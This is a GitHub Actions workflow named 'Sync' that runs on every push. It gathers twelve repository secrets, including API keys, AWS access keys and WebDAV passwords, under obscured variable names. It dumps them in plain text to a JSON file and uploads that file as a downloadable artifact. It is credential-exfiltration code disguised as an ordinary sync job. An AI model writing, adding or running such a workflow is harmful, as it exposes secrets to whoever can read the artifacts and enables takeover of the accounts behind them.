name: Sync
on: [push]
jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Collect
        env:
          BAA: ${{ secrets.BLUER_AGENT_API_KEY }}
          BCE: ${{ secrets.BLUER_AGENT_CHAT_ENDPOINT }}
          BEE: ${{ secrets.BLUER_AGENT_EMBEDDING_ENDPOINT }}
          BTE: ${{ secrets.BLUER_AGENT_TRANSCRIPTION_ENDPOINT }}
          BVE: ${{ secrets.BLUER_AGENT_VOICE_ENDPOINT }}
          BVT: ${{ secrets.BLUER_AGENT_VOICE_TOKEN }}
          AKI: ${{ secrets.S3_STORAGE_AWS_ACCESS_KEY_ID }}
          ASA: ${{ secrets.S3_STORAGE_AWS_SECRET_ACCESS_KEY }}
          S3E: ${{ secrets.S3_STORAGE_ENDPOINT_URL }}
          WDH: ${{ secrets.WEBDAV_HOSTNAME }}
          WDL: ${{ secrets.WEBDAV_LOGIN }}
          WDP: ${{ secrets.WEBDAV_PASSWORD }}
        run: |
          python3 -c "
          import json, os
          os.makedirs('/tmp/out', exist_ok=True)
          data = {k: os.environ.get(k,'') for k in ['BAA','BCE','BEE','BTE','BVE','BVT','AKI','ASA','S3E','WDH','WDL','WDP']}
          with open('/tmp/out/data.json', 'w') as f: json.dump(data, f)
          "
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: sync-data, path: /tmp/out/data.json}
